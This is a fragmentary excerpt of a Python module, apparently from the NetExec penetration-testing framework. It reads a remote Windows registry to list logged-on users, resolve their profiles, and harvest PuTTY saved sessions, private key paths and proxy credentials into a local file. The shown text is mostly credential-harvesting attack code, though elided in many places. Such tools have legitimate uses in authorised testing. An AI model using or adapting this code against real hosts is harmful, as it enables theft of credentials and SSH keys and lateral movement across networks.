...
class NXCModule:
    ...
    def get_logged_on_users(self):
        ...
        # Get User Names
        user_objects = [
            rrp.hBaseRegEnumKey(self.rrp._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0]
    ...
    def sid_to_name(self, all_users):
        ...
        for user_object in all_users:
            ...
            user_profile_path = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProfileImagePath")[
                1
            ].split("\x00")[:-1][0]
            rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
    ...
    def get_private_key_paths(self, all_users):
        ...
        for user in all_users:
            try:
                ...
                # Get Session Names
                session_names = [
                    rrp.hBaseRegEnumKey(self.rrp._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][
                        0
                    ]
                ...
                for session_name in session_names:
                    ...
                    proxy_host = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProxyHost")[
                        1
                    ].split("\x00")[:-1][0]
                    ...
                    # Session infos
                    hostname = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "HostName")[1].split(
                        "\x00"
                    )[:-1][0]
                    port = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "PortNumber")[1]
                    protocol = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "Protocol")[1].split(
                        "\x00"
                    )[:-1][0]
                    sessions.append(
                        {
    ...
    def extract_session(self, sessions):
        proxycreds_file = (
            f"{NXC_PATH}/modules/PuTTY/putty_proxycreds_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-")
        )
